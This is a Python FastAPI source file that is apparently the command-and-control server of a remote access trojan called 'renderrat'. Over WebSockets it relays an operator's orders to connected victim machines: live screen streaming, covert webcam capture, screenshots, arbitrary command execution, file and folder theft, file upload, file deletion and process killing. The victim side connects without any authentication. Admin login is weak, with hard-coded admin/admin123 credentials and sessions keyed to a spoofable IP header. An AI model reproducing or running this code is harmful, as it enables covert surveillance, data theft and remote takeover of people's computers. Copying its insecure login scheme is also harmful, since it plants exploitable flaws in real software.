from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, StreamingResponse, RedirectResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
import base64
import io
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set, Optional
import json
import os
from datetime import datetime, timedelta
import asyncio

app = FastAPI()
security = HTTPBasic()

# ===============================
# AUTH CONFIG
# ===============================

AUTH_FILE = "auth.json"
SESSION_FILE = "sessions.json"
SESSION_TIMEOUT = 600  # 10 minutes in seconds

# Load users from auth.json
def load_users():
    try:
        with open(AUTH_FILE, 'r') as f:
            data = json.load(f)
            return {u['username']: u['password'] for u in data.get('users', [])}
    except:
        return {"admin": "admin123"}  # Default fallback

# Load/Save sessions
def load_sessions():
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f).get('sessions', [])
    except:
        return []

def save_sessions(sessions):
    with open(SESSION_FILE, 'w') as f:
        json.dump({"sessions": sessions}, f, indent=2)

# Clean expired sessions
def clean_expired_sessions():
    sessions = load_sessions()
    now = datetime.now()
    active = [s for s in sessions if datetime.fromisoformat(s['expires']) > now]
    if len(active) != len(sessions):
        save_sessions(active)
    return active

# Check if IP is authenticated
def is_ip_authenticated(ip: str) -> bool:
    sessions = clean_expired_sessions()
    return any(s['ip'] == ip for s in sessions)

# Add new session
def add_session(username: str, ip: str):
    sessions = clean_expired_sessions()
    expires = (datetime.now() + timedelta(seconds=SESSION_TIMEOUT)).isoformat()
    
    # Check if this IP already exists for this user
    existing = [s for s in sessions if s['username'] == username and s['ip'] == ip]
    if existing:
        # Update expiry
        for s in sessions:
            if s['username'] == username and s['ip'] == ip:
                s['expires'] = expires
    else:
        # Add new session
        sessions.append({
            "username": username,
            "ip": ip,
            "expires": expires,
            "login_time": datetime.now().isoformat()
        })
    
    save_sessions(sessions)

# Verify credentials
def verify_credentials(username: str, password: str) -> bool:
    users = load_users()
    return users.get(username) == password

# Get client IP
def get_client_ip(request: Request) -> str:
    # Try to get real IP from headers (for proxies)
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host

# ===============================
# AUTH DEPENDENCY
# ===============================

async def verify_auth(request: Request):
    client_ip = get_client_ip(request)
    
    # Check if IP already authenticated
    if is_ip_authenticated(client_ip):
        return True
    
    # Redirect to login if not authenticated
    raise HTTPException(status_code=401, detail="Not authenticated")

# ===============================
# TEMPLATES + STATIC
# ===============================

templates = Jinja2Templates(directory="templates")

if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# CONNECTIONS
# ===============================

clients: Dict[str, WebSocket] = {}
admins: Set[WebSocket] = set()

# Track which admin is watching which client (for stream routing)
admin_watching: Dict[WebSocket, str] = {}   # admin_ws → client_id

# File transfer buffer: transfer_id -> {filename, chunks, total_chunks, done}
file_transfers: Dict[str, dict] = {}
# Folder transfer: tid -> {folder_name, files: {arcname: chunks}, total_files}
folder_transfers: Dict[str, dict] = {}

# ===============================
# AUTH PAGES
# ===============================

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    """Login page"""
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login(request: Request):
    """Handle login"""
    form = await request.form()
    username = form.get("username")
    password = form.get("password")
    
    if verify_credentials(username, password):
        client_ip = get_client_ip(request)
        add_session(username, client_ip)
        return RedirectResponse(url="/", status_code=303)
    else:
        return templates.TemplateResponse("login.html", {
            "request": request,
            "error": "Invalid username or password"
        })

@app.get("/logout")
async def logout(request: Request):
    """Logout - remove IP from sessions"""
    client_ip = get_client_ip(request)
    sessions = load_sessions()
    sessions = [s for s in sessions if s['ip'] != client_ip]
    save_sessions(sessions)
    return RedirectResponse(url="/login", status_code=303)

# ===============================
# PROTECTED PAGES
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    """Admin panel - protected"""
    client_ip = get_client_ip(request)
    
    if not is_ip_authenticated(client_ip):
        return RedirectResponse(url="/login", status_code=303)
    
    return templates.TemplateResponse("admin.html", {"request": request})

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "clients_online": len(clients),
        "admins_online": len(admins)
    }

# ===============================
# FILE DOWNLOAD ENDPOINT
# ===============================

@app.get("/download/{transfer_id}")
async def download_file(transfer_id: str, request: Request):
    """Admin download file đã nhận từ Client qua HTTP GET."""
    client_ip = get_client_ip(request)
    if not is_ip_authenticated(client_ip):
        raise HTTPException(status_code=401, detail="Not authenticated")
    
    t = file_transfers.get(transfer_id)
    if not t:
        return HTMLResponse("<h3>File not found or expired</h3>", status_code=404)
    if not t.get("done"):
        return HTMLResponse("<h3>File transfer not complete yet</h3>", status_code=425)

    # Ghép chunks
    buffer = io.BytesIO()
    for i in range(t["total_chunks"]):
        chunk = t["chunks"].get(i, "")
        buffer.write(base64.b64decode(chunk))
    buffer.seek(0)

    filename = t["filename"]
    return StreamingResponse(
        buffer,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )

@app.get("/download_folder/{transfer_id}")
async def download_folder(transfer_id: str, request: Request):
    """Ghép tất cả file của folder transfer thành zip để admin download."""
    client_ip = get_client_ip(request)
    if not is_ip_authenticated(client_ip):
        raise HTTPException(status_code=401, detail="Not authenticated")
    
    import zipfile as zf
    ft = folder_transfers.get(transfer_id)
    if not ft:
        return HTMLResponse("<h3>Folder transfer not found</h3>", status_code=404)
    if not ft.get("done"):
        return HTMLResponse("<h3>Folder transfer incomplete</h3>", status_code=425)

    buf = io.BytesIO()
    with zf.ZipFile(buf, "w", zf.ZIP_DEFLATED) as z:
        for arcname, fdata in ft["files"].items():
            chunks = fdata["chunks"]
            total  = fdata["total_chunks"]
            fbuf = io.BytesIO()
            for i in range(total):
                fbuf.write(base64.b64decode(chunks.get(i, "")))
            z.writestr(arcname, fbuf.getvalue())
    buf.seek(0)
    fname = ft["folder_name"] + ".zip"
    return StreamingResponse(buf, media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="{fname}"'}
    )

# ===============================
# CLIENT WEBSOCKET (NO AUTH)
# ===============================

@app.websocket("/ws/client/{client_id}")
async def client_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")

            # ── Stream frame — forward nhanh nhất có thể ──────────
            if msg_type == "stream_frame":
                await broadcast_stream_frame(client_id, {
                    "type": "stream_frame",
                    "client_id": client_id,
                    "image": message.get("image"),
                    "ts": message.get("ts")
                })


            elif msg_type == "webcam_frame":
                await broadcast_webcam_frame(client_id, {
                    "type": "webcam_frame",
                    "client_id": client_id,
                    "image": message.get("image"),
                    "ts": message.get("ts")
                })

            elif msg_type == "webcam_error":
                await broadcast_to_admins({
                    "type": "webcam_error",
                    "client_id": client_id,
                    "error": message.get("error")
                })

            elif msg_type == "stream_stopped_by_webcam":
                # Có thể thông báo cho admin nếu cần
                await broadcast_to_admins({
                    "type": "stream_stopped",
                    "client_id": client_id,
                    "reason": "webcam_started"
                })


            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "screenshot":
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": message.get("image")
                })

            # ── Command result ────────────────────────────────────
            elif msg_type == "command_result":
                await broadcast_to_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "output": message.get("output")
                })

            # ── File transfer: Client → Admin ─────────────────────
            elif msg_type in ("file_transfer_start", "file_chunk", "file_transfer_done",
                              "file_transfer_error", "file_transfer_progress",
                              "folder_transfer_start", "folder_transfer_done", "folder_transfer_empty"):
                transfer_id = message.get("transfer_id")

                if msg_type == "folder_transfer_start":
                    folder_transfers[transfer_id] = {
                        "folder_name": message.get("folder_name"),
                        "total_files": message.get("total_files"),
                        "files": {},
                        "done": False
                    }

                elif msg_type == "folder_transfer_done":
                    if transfer_id in folder_transfers:
                        folder_transfers[transfer_id]["done"] = True

                elif msg_type == "file_transfer_start":
                    is_folder = message.get("is_folder", False)
                    arcname   = message.get("filename")
                    total_c   = message.get("total_chunks")
                    if is_folder and transfer_id in folder_transfers:
                        # Track individual file inside folder
                        folder_transfers[transfer_id]["files"][arcname] = {"chunks": {}, "total_chunks": total_c}
                    else:
                        file_transfers[transfer_id] = {
                            "filename": arcname,
                            "file_size": message.get("file_size"),
                            "total_chunks": total_c,
                            "chunks": {},
                            "done": False,
                            "client_id": client_id
                        }

                elif msg_type == "file_chunk":
                    idx  = message.get("chunk_idx")
                    data_val = message.get("data")
                    is_folder = message.get("is_folder") or (transfer_id in folder_transfers)
                    if is_folder and transfer_id in folder_transfers:
                        # Find current file being transferred
                        for arcname, fdata in folder_transfers[transfer_id]["files"].items():
                            if len(fdata["chunks"]) < fdata["total_chunks"] and idx not in fdata["chunks"]:
                                fdata["chunks"][idx] = data_val
                                break
                    elif transfer_id in file_transfers:
                        file_transfers[transfer_id]["chunks"][idx] = data_val

                elif msg_type == "file_transfer_done":
                    is_folder = message.get("is_folder", False)
                    if not is_folder and transfer_id in file_transfers:
                        file_transfers[transfer_id]["done"] = True
                        print(f"[FILE] Done: {message.get('filename')} ({message.get('file_size')} bytes)")

                # Relay progress đến admin
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "transfer_id": transfer_id,
                    "filename": message.get("filename"),
                    "file_size": message.get("file_size"),
                    "total_chunks": message.get("total_chunks"),
                    "chunk_idx": message.get("chunk_idx"),
                    "error": message.get("error")
                })

            # ── File save result (Admin → Client download kết quả) ─
            elif msg_type == "file_save_result":
                await broadcast_to_admins({
                    "type": "file_save_result",
                    "client_id": client_id,
                    "transfer_id": message.get("transfer_id"),
                    "path": message.get("path"),
                    "error": message.get("error")
                })

            # ── Client connected (sysinfo) ─────────────────────────
            elif msg_type == "client_connected":
                await broadcast_to_admins({
                    "type": "client_info",
                    "client_id": client_id,
                    "sysinfo": message.get("sysinfo")
                })

            elif msg_type == "delete_result":
                await broadcast_to_admins({
                    "type": "delete_result",
                    "client_id": client_id,
                    "results": message.get("results")
                })

            # ── Other data (sysinfo, processes, files…) ───────────
            else:
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "data": message.get("data"),
                    "result": message.get("result"),
                    "path": message.get("path"),
                    "message": message.get("message"),
                    "status": message.get("status")
                })

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[CLIENT ERR] {client_id}: {e}")
    finally:
        if client_id in clients:
            del clients[client_id]
        # Dừng stream cho các admin đang xem client này
        await stop_stream_for_client(client_id)
        print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
        await notify_admins_clients()

# ===============================
# ADMIN WEBSOCKET (WITH AUTH CHECK)
# ===============================

@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    # Get IP from websocket
    client_ip = websocket.client.host
    
    # Check authentication
    if not is_ip_authenticated(client_ip):
        await websocket.close(code=1008, reason="Not authenticated")
        return
    
    await websocket.accept()
    admins.add(websocket)
    print(f"[ADMIN +] {client_ip} | Total: {len(admins)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")
            client_id = message.get("client_id")

            # ── Stream control ────────────────────────────────────
            if msg_type == "start_stream":
                if client_id and client_id in clients:
                    admin_watching[websocket] = client_id
                    await clients[client_id].send_text(json.dumps({
                        "type": "start_stream"
                    }))
                    print(f"[STREAM] Admin started stream → {client_id}")

            elif msg_type == "stop_stream":
                if client_id and client_id in clients:
                    if websocket in admin_watching:
                        del admin_watching[websocket]
                    # Dừng stream nếu không còn admin nào xem
                    watchers = [a for a, c in admin_watching.items() if c == client_id]
                    if not watchers:
                        await clients[client_id].send_text(json.dumps({
                            "type": "stop_stream"
                        }))
                    print(f"[STREAM] Admin stopped stream → {client_id}")

            # Trong admin_ws, thêm các case
            elif msg_type == "start_webcam":
                if client_id and client_id in clients:
                    # Nếu admin đang xem stream screen, ta có thể dừng nó ở client, nhưng client tự xử lý
                    # Ở đây chỉ forward
                    admin_watching[websocket] = client_id  # ghi nhận admin đang xem client này
                    await clients[client_id].send_text(json.dumps({
                        "type": "start_webcam"
                    }))
                    print(f"[WEBCAM] Admin started webcam → {client_id}")

            elif msg_type == "stop_webcam":
                if client_id and client_id in clients:
                    if websocket in admin_watching:
                        del admin_watching[websocket]  # không còn xem nữa
                    # Kiểm tra còn admin nào xem client này không, nếu không thì gửi stop
                    watchers = [a for a, c in admin_watching.items() if c == client_id]
                    if not watchers:
                        await clients[client_id].send_text(json.dumps({
                            "type": "stop_webcam"
                        }))
                    print(f"[WEBCAM] Admin stopped webcam → {client_id}")
                    
                            
            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "request_screenshot":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot",
                        "quality": message.get("quality", 85)
                    }))

            # ── Command ───────────────────────────────────────────
            elif msg_type == "command":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": message.get("command")
                    }))

            # ── Sysinfo ───────────────────────────────────────────
            elif msg_type == "request_sysinfo":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_sysinfo"}))

            # ── Processes ─────────────────────────────────────────
            elif msg_type == "request_processes":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_processes"}))

            elif msg_type == "kill_process":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "kill_process",
                        "pid": message.get("pid")
                    }))

            # ── Files ─────────────────────────────────────────────
            elif msg_type == "list_directory":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "list_directory",
                        "path": message.get("path", ".")
                    }))

            elif msg_type == "get_drives":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "get_drives"
                    }))

            elif msg_type == "read_file":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "read_file",
                        "path": message.get("path")
                    }))

            # ── File: Admin yêu cầu Client gửi file lên ───────────
            elif msg_type == "request_file_upload":
                if client_id in clients:
                    import uuid as _uuid
                    transfer_id = message.get("transfer_id") or str(_uuid.uuid4())[:8]
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_file_upload",
                        "path": message.get("path"),
                        "transfer_id": transfer_id
                    }))
                    print(f"[FILE] Request upload: {message.get('path')} from {client_id}")

            # ── File: Admin gửi file xuống Client ─────────────────
            elif msg_type == "send_file_to_client":
                if client_id in clients:
                    # Forward toàn bộ file_transfer_start + chunks + done
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_transfer_start",
                        "transfer_id": message.get("transfer_id"),
                        "filename": message.get("filename"),
                        "file_size": message.get("file_size"),
                        "total_chunks": message.get("total_chunks"),
                        "save_dir": message.get("save_dir", ".")
                    }))

            elif msg_type in ("send_chunk_to_client",):
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_chunk",
                        "transfer_id": message.get("transfer_id"),
                        "chunk_idx": message.get("chunk_idx"),
                        "total_chunks": message.get("total_chunks"),
                        "data": message.get("data")
                    }))

            elif msg_type == "finish_file_to_client":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_transfer_done",
                        "transfer_id": message.get("transfer_id"),
                        "filename": message.get("filename"),
                        "file_size": message.get("file_size")
                    }))
            elif msg_type == "delete_files":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "delete_files",
                        "paths": message.get("paths")
                    }))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ADMIN ERR] {e}")
    finally:
        admins.discard(websocket)
        # Dừng stream nếu admin đang xem
        if websocket in admin_watching:
            client_id = admin_watching.pop(websocket)
            watchers = [a for a, c in admin_watching.items() if c == client_id]
            if not watchers and client_id in clients:
                await clients[client_id].send_text(json.dumps({"type": "stop_stream"}))
        print(f"[ADMIN -] Total: {len(admins)}")

# ===============================
# HELPERS
# ===============================

async def notify_admins_clients():
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

async def broadcast_to_admins(message: dict):
    dead = set()
    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)

async def broadcast_stream_frame(client_id: str, message: dict):
    """Chỉ gửi stream frame cho admin đang xem client này"""
    dead = set()
    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
    payload = json.dumps(message)
    for admin in watchers:
        try:
            await admin.send_text(payload)
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)
        admin_watching.pop(d, None)


async def broadcast_webcam_frame(client_id: str, message: dict):
    """Chỉ gửi webcam frame cho admin đang xem client này"""
    dead = set()
    # Có thể dùng chung admin_watching hoặc tạo riêng webcam_watching
    # Ở đây dùng chung admin_watching (vì chỉ một loại stream tại một thời điểm)
    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
    payload = json.dumps(message)
    for admin in watchers:
        try:
            await admin.send_text(payload)
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)
        admin_watching.pop(d, None)



async def stop_stream_for_client(client_id: str):
    """Notify admins đang xem client vừa disconnect"""
    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
    for admin in watching_admins:
        admin_watching.pop(admin, None)
        try:
            await admin.send_text(json.dumps({
                "type": "stream_stopped",
                "client_id": client_id,
                "reason": "client_disconnected"
            }))
        except Exception:
            pass

# ===============================
# BACKGROUND TASK: Clean sessions
# ===============================

@app.on_event("startup")
async def startup_event():
    print("=" * 50)
    print("  Server Started!")
    print("=" * 50)
    print("  Admin : https://renderrat.onrender.com")
    print("  Login : https://renderrat.onrender.com/login")
    print("  Client: wss://renderrat.onrender.com/ws/client/{id}")
    print("=" * 50)
    
    # Start background task to clean sessions every minute
    asyncio.create_task(session_cleanup_task())

async def session_cleanup_task():
    """Background task to clean expired sessions every minute"""
    while True:
        await asyncio.sleep(60)  # Run every 60 seconds
        try:
            clean_expired_sessions()
            print("[AUTH] Cleaned expired sessions")
        except Exception as e:
            print(f"[AUTH] Error cleaning sessions: {e}")
